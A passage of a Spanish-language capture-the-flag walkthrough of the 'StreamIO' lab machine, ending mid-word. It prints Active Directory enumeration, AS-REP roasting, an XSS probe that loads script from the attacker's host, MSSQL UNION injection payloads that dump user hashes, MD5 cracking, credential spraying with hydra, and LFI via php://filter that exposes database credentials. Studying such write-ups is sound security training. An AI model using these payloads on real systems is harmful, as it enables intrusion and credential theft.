
# Reconocimiento
```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.3.119 -oG allPorts
```

```shell

 [*] IP Address: 10.129.3.119
 [*] Open ports: 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49708,49734
```

```shell
nmap -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49708,49734 -sCV -oN targeted 10.129.3.119
```

## SMB

```shell
nxc smb 10.129.13.11 
```

### Recursos compartidos

```shell
nxc smb 10.129.13.11 --shares
```

```shell
smbclient -L 10.129.13.11 -N
```

No podemos enumerar ningún recurso compartido

## Kerberos
Haremos una enumeración de usuarios a través de kerberos
```shell
kerbrute userenum --dc 10.129.13.11 -d streamIO.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
```

Encontrando los usuarios
```ad-info
martin@streamIO.htb
administrator@streamIO.htb
```

Validamos los usuarios
```shell
kerbrute userenum --dc 10.129.13.11 -d streamIO.htb users.txt 
```

Viendo que son usuarios que existen

Probaremos si los usuarios son vulnerables a [[AS-REP Roasting]]
### AS-REP Roast Attack
```shell
impacket-GetNPUsers -no-pass -usersfile users.txt streamIO.htb/
```

Probaremos también si tienen el nombre de usuario como contraseña
### User as Password
```shell
nxc smb 10.129.13.11 -u users.txt -p users.txt
```

## LDAP
Enumeraremos el LDAP
```shell
ldapsearch -x -H ldap://10.129.13.11 -b "DC=streamIO,DC=local" 
```

Enumeramos posibles usuarios
```shell
dapsearch -x -H ldap://10.129.13.11 -b "DC=streamIO,DC=local" | grep -i userprincipalname
```

## HTTPS
AL no encontrar mas información relevante en las pruebas realizadas anteriormente probaremos accediendo al recurso web que esta levantado en el puerto 443
```shell
https://streamio.htb/
```

Vemos que hay una zona de CONTAC US, en la cual se indica al enviar el mensaje hay una persona revisando la incidencia y que envía una respuesta, probaremos a hacer una inyección XSS para ver si esto se acontece
```javascript
<script src="http://10.10.14.116/test"></script>
```

En nuestra maquina nos levantaremos un servidor con python
Vemos que no se nos devuelve ninguna respuesta

También hay una zona de login y de crearnos una cuenta, procederemos a creárnosla, observamos que no se nos crea la cuenta, suponiendo que el panel no funciona correctamente

También encontramos un subdominio al que podemos acceder
```shell
https://watch.streamio.htb/
```

Haremos de nuevo fuzzing en búsqueda de archivos .php
```shell
ffuf -c -u https://watch.streamio.htb/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

Encontrando un `search`, `index` y `blocked`, navegaremos a los recursos a ver de que se trata, encontrando una zona de búsqueda de peliculas en el caso de `search`

En este buscador de peliculas interceptamos la petición y vemos que si intentamos introducir una petición SQL por ejemplo nos muestra una ventana en la que se nos dice que la petición no es valida y al sesión se bloqueara.

Al estar trabajando sobre un Microsoft lo primero que tendremos que hacer es identificar el tipo de base de datos, que lo mas seguro es que se trate de un MSSQL

Podemos probar identificando el numero de columnas usando
```sql
'union select 1--
```

Hasta que se nos muestre algo diferente por pantalla en este caso se ha identificado hasta la columna numero 6
```sql
'union select 1,2,3,4,5,6--
```

Observamos que modificando las columnas podemos ver resultados por pantalla en este caso la columna numero 2 al ser modifica y por ejemplo introducir otro numero como un 9 se nos muestra en pantalla
```sql
'union select 1,9,3,4,5,6--
```

Pudiendo sacar la versión del servicio MSSQL
```sql
'union select 1,@@version,3,4,5,6--
```

```ad-info
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
```

Tambien veremos que usuario somos en la base de datos
```sql
'union select 1,user_name(),3,4,5,6--
```

Ayudándonos de payloads all the things podemos identificar el nombre de la base de datos que se esta usando
```sql
'union select 1,(SELECT DB_NAME()),3,4,5,6--
```

Tambien podemos enumerar todas las demas bases de datos
```sql
'union select 1,name,3,4,5,6 from master..sysdatabases--
```

Encontrando una tabla llamada `streamio_backup` la enumeraremos
```sql
'union select 1,name,3,4,5,6 from streamio_backup..sysobjects where xtype='U';--
```

No dejandonos enumerarla

A continuación buscaremos como listar las tablas activas
```sql
'union select 1,name,3,4,5,6 from streamio..sysobjects where xtype='U';--
```

Encontramos las tablas `movies` y la tabla `users`, asi que vamos a enumerar la tabla users
En el valor 3 sacaremos el Id de la tabla de usuarios
```sql
'union select 1,name,id,4,5,6  from streamio..sysobjects where xtype='U';--
```

y ahora sacaremos el valor de esta tabla con identificador `901578250`
```sql
'union select 1,name,3,4,5,6  from syscolumns where id = 901578250;--
```

Ahora vamos a listar el contenido de las columnas que encontramos los que mas nos interesan son `username` y `password`
```sql
'union select 1,concat(username,':',password),3,4,5,6  from users--
```

Nos copiamos todos los nombres de usuarios junto con su hash que nos ha devuelto en un archivo
Y vamos a intentar crackear, primero identificaremos el tipo de hash con [[HASHIDENTIFIER]]
```shell
hash-identifier 665a50ac9eaa781e4f7f04199db97a11
```

Mostrándonos que es MD5
Así que ya podemos crackearlos dándole el formato que le corresponde
```shell
john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
```

Obteniendo así las contraseñas de los usuarios
```shell
john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d'
```

Los usuarios los añadiremos al los que ya habíamos enumerado anteriormente
```shell
john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d' | awk '{print $1}' FS=":" >> users.txt 
```

Y las contraseñas las guardamos en otro archivo 
```shell
john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d' | awk '{print $2}' FS=":" > passwords.txt
```

Validaremos cual de los usuarios es valido en el servidor usando Kerberos

## Kerberos
```shell
kerbrute userenum --dc 10.129.13.11 -d streamIO.htb users.txt
```

Viendo como usuarios validos
```ad-info
martin@streamIO.htb
administrator@streamIO.htb
yoshihide@streamIO.htb
```

También vamos a validar si las contraseñas de todos los usuarios son validas o corresponden a las extraídas
```shell
nxc smb 10.129.13.11 -u users.txt -p passwords.txt --no-bruteforce
```

Ninguna es valida
Probaremos ahora implementando fuerza bruta
```shell
nxc smb 10.129.13.11 -u users.txt -p passwords.txt --continue-on-success
```

Siendo de nuevo un intento fallido

Ya que tenemos de nuevo una lista de usuarios validos vamos a volver a verificar si alguno es vulnerable a AS-REP Roast attack

### AS-REP Roast
```shell
impacket-GetNPUsers -no-pass -usersfile users.txt streamIO.htb/
```

## HTTPS
Probaremos a reutilizar estos usuarios y contraseñas en la web que contenía un login
```shell
https://streamio.htb
```

Probaremos con el usuarios que hemos encontrado como valido en el kerbrute
```ad-tip
yoshihide::66boysandgirls..
```

Consiguiendo acceder con el usuario
Vamos a probar con los demás usuarios usando [[HYDRA]]
```shell
hydra -C validcredentials.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

Solo nos muestra como valida
```ad-hint
yoshihide::66boysandgirls..
```


Con este usuario ahora podemos acceder a `/admin` ya que es un usuario logeado y además es usuario administrador en la web
 Al navegar por los recursos nos encontramos este tipo de peticionen la URL
 ```shell
 https://streamio.htb/admin/?staff=
 ```

Haremos fuzzing sobre el parámetro `staff`
```shell
ffuf -c -H "Cookie: PHPSESSID=013o9pb8nqhcbig4n4ib0e2id0" -u "https://watch.streamio.htb/admin/?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --fc=404
```

Como nos da muchos falsos positivos filtraremos mas las respuestas
```shell
ffuf -c -H "Cookie: PHPSESSID=013o9pb8nqhcbig4n4ib0e2id0" -u "https://streamio.htb/admin/?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --fc=404 --fw=85
```

Encontrando la opción de `debug` la cual al introducirla en la URL nos dice que es una opción solo para desarrolladores
Probaremos incluyendo caracteres como el `.` o una `'` pero no nos resuelve, vamos a probar llamando a una ruta interna del sistema como es `C:\Windows\System32\drivers\etc\hosts` la cual si que se nos muestra por pantalla obteniendo así un *LFI* el cual se puede utilizar para leer contenido de ficheros `.php` el cual utilizando wrappers podemos conseguir leerlo

Obtener el contenido del `index.php`
```shell
php://filter/convert.base64-encode/resource=index.php
```

El contenido obtenido lo decodeamos del base64 en nuestra terminal
Encontrando un usuario y una contraseña
```ad-hint
db_admin::B1@hx31234567890
```

Con el cual podamos acceder al backup anteriormente enumerado
Volveremos a hacer fuzing sobre el `/admin` para buscar archivos `.php`
```shell
fuf -c -u "https://streamio.htb/admin/FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --fc=404 
```

Encontrando el archivo master
Nos l





